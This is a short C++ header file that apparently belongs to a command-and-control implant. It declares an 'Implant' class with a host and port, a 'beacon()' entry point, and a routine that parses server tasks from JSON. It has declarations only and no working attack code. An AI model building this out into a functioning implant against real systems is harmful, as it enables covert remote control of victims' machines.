#pragma once

#include <string>
#include <string_view>
#include <mutex>
#include <future>
#include <atomic>
#include <vector>
#include <random>
#include <iostream>
#include <chrono>
#include <algorithm>

#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_io.hpp>

#include <boost/property_tree/json_parser.hpp>
#include <boost/property_tree/ptree.hpp>

#include "api.hpp"
#include "task.hpp"

class Implant {
    public:
        Implant(std::string host, std::string port);

        /* Implant entry point */
        void beacon();

    private:
	    std::unique_ptr<Api> api = nullptr;
        std::string id;
        bool is_running;

        /**
         * @brief Utility to parse a std::string JSON response to a vector of Task
         * 
         * @param response 
         * @return std::vector<Task> 
         */
        std::vector<Task> parse_tasks_response(const std::string &response);
};
